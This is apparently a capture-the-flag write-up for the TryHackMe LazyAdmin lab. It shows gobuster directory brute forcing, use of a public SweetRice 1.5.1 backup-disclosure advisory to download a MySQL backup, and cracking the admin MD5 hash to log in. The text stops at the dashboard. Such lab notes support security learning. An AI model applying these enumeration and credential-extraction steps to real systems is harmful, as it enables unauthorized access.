

http://10.10.195.175/

![[main80.png]]

just a default web server

brute forcing web server directories we find a new directory

```
gobuster dir -u http://10.10.195.175:80 -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/LazyAdmin/2-enum/web/gob_dir.md
```

```
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/content              (Status: 301) [Size: 316] [--> http://10.10.195.175/content/]
/server-status        (Status: 403) [Size: 278]
```

http://10.10.195.175/content/

![[content_dir.png]]


https://github.com/p0dalirius/SweetRice-webshell-plugin

guessed this directory from the github page

http://10.10.195.175/content/as/

![[sweetriceloginpage.png]]

this login form didn't reaaly lead anywhere, but after some searching for vulnerabilities

https://vulners.com/zdt/1337DAY-ID-26249

```
# SweetRice 1.5.1 - Backup Disclosure Vulnerability

Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
 
 
Proof of Concept :
 
You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup
 
and can access to website files backup from:
http://localhost/SweetRice-transfer.zip

#  0day.today [2018-02-19]  #
```

from  here we can imply a */inc* directory

http://10.10.195.175/content/inc/

![[content_inc.png]]

we can find the mysql backup file

http://10.10.195.175/content/inc/mysql_backup/

![[mysqlbakaccess.png]]


while we are at it, we can confirm what version of sweetrice cms is running

http://10.10.195.175/content/inc/lastest.txt

1.5.1


from the sql backup file that we downloaded we see the following contents

```
"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\
```

specifically this md5 looking hash

```
42f749ade7f9e195bf475f37a44cafcb
```

reversing the hash
```
Password123
```

back to the login page with these credentials. the username was the name/user next to that password hash in the backup file

http://10.10.195.175/content/as/

```
manager
Password123
```

successful login

![[sr-dashboard.png]]
